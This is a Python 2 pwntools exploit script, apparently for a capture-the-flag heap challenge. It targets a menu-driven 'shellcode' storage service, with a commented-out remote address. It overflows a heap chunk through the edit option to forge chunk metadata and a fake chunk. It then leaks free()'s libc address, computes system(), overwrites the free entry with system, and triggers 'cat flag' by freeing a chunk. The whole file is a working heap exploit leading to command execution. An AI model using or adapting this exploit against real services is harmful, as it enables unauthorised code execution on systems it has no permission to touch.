#!/usr/bin/python2

from pwn import *

r = remote('127.0.0.1', 4444)
#r = remote('119.254.101.197', 10002)

def new(shellcode):
    print r.recvuntil('> ')
    r.send('2\n')
    print r.recvuntil('Length of new shellcode: ')
    r.send(str(len(shellcode)) + '\n')
    print r.recvuntil('Enter your shellcode(in raw format): ')
    r.send(shellcode)
    print r.recvuntil('Successfully created a new shellcode.')

def list():
    print r.recvuntil('> ')
    r.send('1\n')
    d = r.recvuntil('*')
    print d
    return d


def free(idx):
    print r.recvuntil('> ')
    r.send('4\n')
    print r.recvuntil('Shellcode number: ')
    r.send(str(idx) + '\n')
    print r.recvuntil('Successfully removed a shellcode')

def edit(idx, shellcode):
    print r.recvuntil('> ')
    r.send('3\n')
    print r.recvuntil('Shellcode number: ')
    r.send(str(idx) + '\n')
    print r.recvuntil('Length of shellcode: ')
    r.send(str(len(shellcode)+1) + '\n')
    print r.recvuntil('Enter your shellcode: ')
    r.send(shellcode + '\n')
    print r.recvuntil('Successfully updated a shellcode.')

new('/bin/ls\x00' + 'a' * 56)
new('a' * 64)   # freed chunck
new('a' * 64)   # freed chunck
new('b' * 0x78)
#gdb.attach(r, '''x/20xg 0x6016B8''')

list()

free(1)
free(2)
new('1' * 64)
gdb.attach(r, '''x/20xg 0x6016B8
		 b *0x0000000000400BB7''')
edit(0, 'cat flag\x00' + 'b'*(0x23d3060-0x23d3010-8-9) + p64(0x51) + p64(0x601708))

gdb.attach(r, '''x/20xg 0x6016B8''')
new('d' * 64)   # malloc the freed chunck

new(p64(0x601600) + '\x00' * 60)   # fake chunck

data = list()

start = data.find(':', data.find('SHELLC0DE 3: ')) + 2
s = data[start:start+16]
addr = ''
for i in range(0, 16, 2):
    addr += chr(int(s[i:i+2], 16))

freeaddr = u64(addr)
system = freeaddr - (0x7fdbe1119df0 - 0x7fdbe10dd640)
log.info(hex(system))

edit(3, p64(system))

free(0)
print r.recv(1024)
